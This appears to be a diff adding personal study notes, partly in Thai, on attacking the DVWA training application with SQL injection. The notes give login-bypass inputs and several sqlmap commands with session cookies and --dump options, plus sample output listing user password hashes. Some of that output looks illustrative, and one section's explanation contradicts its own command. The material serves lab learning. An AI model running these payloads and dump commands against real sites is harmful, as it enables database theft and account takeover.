@@ -1,0 +1,184 @@
+sql injection
+- ปรับ security = low
+- inspect ดู cookie ใน web browser จะมี PHPSESSID,security
+- input : 1' OR '1'='1
+- input : ' OR 1=1 -- (both username,password)
+- input : admin' -- 
+
+
+1. sqlmap --cookie "security=low ; PHPSESSID=9c12d2ec2dd8e2188b80b5a85641fcd4" -u "http://target:42001/vulnerabilities/sqli/?id=16&Submit=Submit" --dump --batch (--level=5 --risk=3 --random-agent): เจาะระบบหนักๆ
+
+** ถ้ามี cookie ต้องแนบไปด้วย **
+
+"Try to exploit a SQL injection vulnerability on the id parameter of the target site while using an active session (PHPSESSID). If successful, extract and display all database contents automatically."
+
+output:
+[*] starting at 14:03:25
+
+[INFO] testing connection to the target URL
+[INFO] checking if the target is protected by any WAF/IPS
+[INFO] testing if the GET parameter 'id' is vulnerable
+[INFO] GET parameter 'id' appears to be 'MySQL UNION query injectable'
+
+...
+
+[INFO] fetching database names
+available databases [3]:
+[*] dvwa
+[*] information_schema
+[*] mysql
+
+[INFO] fetching tables for database: 'dvwa'
+available tables [1]:
+[*] users
+
+[INFO] fetching columns for table 'users'
+available columns [5]:
+[*] user
+[*] password
+[*] avatar
+[*] first_name
+[*] last_name
+
+[INFO] fetching entries for table 'users'
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2025-05-25 11:23:48 | 0            |
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2025-05-25 11:23:48 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2025-05-25 11:23:48 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2025-05-25 11:23:48 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2025-05-25 11:23:48 | 0            |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+
+
+[INFO] table 'users' dumped to CSV file: output/target/dvwa/users.csv
+
+
+
+
+2. sqlmap --cookie "security=low ; PHPSESSID=9c12d2ec2dd8e2188b80b5a85641fcd4" -u "http://target:42001/security.php"
+
+In summary, this sqlmap command is attempting to:
+
+Access the web application at http://target:42001/security.php.
+Do so while providing specific cookie values (security=low and a PHPSESSID). This is often done to maintain an authenticated session or to set a specific security context within the web application, which might be necessary for sqlmap to reach the vulnerable code.
+Automatically detect and exploit any SQL injection vulnerabilities on that page, considering the provided cookies as part of the request.
+
+output:
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.x.x#stable}
+|_ -| . ['] | .'["] | |___|_ ["]_|_|_|__,| _| |_|V|_|  http://sqlmap.org
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.
+
+[*] starting at 22:07:58
+
+[22:07:58] [INFO] testing connection to the target URL
+[22:07:59] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS (Web Application Firewall/Intrusion Prevention System/Intrusion Detection System)
+[22:08:00] [INFO] testing if the target URL content is stable
+
+[22:08:05] [INFO] GET parameter 'id' is dynamic
+[22:08:05] [INFO] heuristic test shows that GET parameter 'id' might be injectable (possible DBMS: MySQL)
+[22:08:06] [INFO] testing sql injection on GET parameter 'id'
+[22:08:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:08:08] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable
+[22:08:08] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[22:08:09] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable
+
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of XX HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 2560 FROM(SELECT COUNT(*),CONCAT(0x3a6f69643a,(SELECT (CASE WHEN (2560=2560) THEN 1 ELSE 0 END)),0x3a7362643a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Type: time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+---
+[22:08:10] [INFO] the back-end DBMS is MySQL. Its version is 5.x.x
+web server operating system: Linux (Ubuntu)
+web application technology: Apache 2.x.x, PHP 5.x.x
+back-end DBMS: MySQL >= 5.0
+
+
+
+
+3. sqlmap --cookie "security=low ; PHPSESSID=9c12d2ec2dd8e2188b80b5a85641fcd4" -u "http://target:42001/login.php"  (--forms --crawl=2 --batch)
+
+--forms: Automatically detects and tests form inputs (like username and password)
+--crawl=2: Crawls links up to 2 levels deep to discover more pages/parameters
+--batch: Automatically chooses defaults for prompts
+
+sqlmap -u "http://127.0.0.1:42001/login.php" \
+--cookie="security=low; PHPSESSID=9c12d2ec2dd8e2188b80b5a85641fcd4" \
+--data="username=admin&password=admin&Login=Login" \
+--level=5 --risk=3 --tamper=space2comment --random-agent \
+--dump --batch
+
+✅ What does this do?
+It tests whether the POST parameters username and password are injectable.
+If vulnerable, it will extract and dump tables from the database — often including usernames and passwords (like admin and password).
+
+
+What sqlmap will likely do and what the output will be:
+
+Initial connection and analysis: sqlmap will connect to http://target:42001/login.php and use the provided cookies. It will start analyzing the parameters (usually username and password on a login page) for injectability.
+No SQL Injection found: Because the security=impossible cookie setting is applied, the backend code for the login page (and any other page you visit with this cookie) will have robust input validation, parameterized queries, or other protective measures in place. sqlmap will send its various payloads, but none of them will likely trigger an SQL injection vulnerability.
+Outcome: You will almost certainly see sqlmap report that "no injection point(s) found".
+
+output:
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.x.x#stable}
+|_ -| . ['] | .'["] | |___|_ ["]_|_|_|__,| _| |_|V|_|  http://sqlmap.org
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.
+
+[*] starting at 22:11:39
+
+[22:11:39] [INFO] testing connection to the target URL
+[22:11:40] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[22:11:41] [INFO] testing if the target URL content is stable
+[22:11:42] [INFO] parsing HTTP form for possible injections
+[22:11:43] [INFO] heuristic test shows that POST parameter 'username' might not be injectable
+[22:11:43] [INFO] heuristic test shows that POST parameter 'password' might not be injectable
+[22:11:44] [INFO] testing sql injection on POST parameter 'username'
+[22:11:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+... (many more tests will run) ...
+[22:11:50] [INFO] testing 'PostgreSQL UNION query'
+[22:11:51] [WARNING] no injection point(s) found
+[22:11:51] [INFO] shutting down at 22:11:51
+
+
+
+
+4. ss -nltp
+ดู port ที่เปิด
+
+
+
+5.sqlmap --cookie "security=low ; PHPSESSID=9c12d2ec2dd8e2188b80b5a85641fcd4" \
+-u "http://target:42001/vulnerabilities/sqli/?id=16&Submit=Submit" \
+--dump --batch --proxy http://localhost:8080
+ 	
+ใช้ทำอะไร?
+1.ทดสอบว่าพารามิเตอร์ id=16 มีช่องโหว่ SQL Injection หรือไม่
+2.หากพบช่องโหว่ จะทำการ "dump" ข้อมูลออกมาจากฐานข้อมูล
+3.ส่ง traffic ผ่าน Burp Suite (proxy ที่พอร์ต 8080) เพื่อให้เราดู traffic ได้แบบละเอียด
+
+
+output:
+Database: dvwa
+Table: users
++----+--------+----------+
+| id | user   | password |
++----+--------+----------+
+| 1  | admin  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| 2  | guest  | 084e0343a0486ff05530df6c705c8bb4 |
++----+--------+----------+
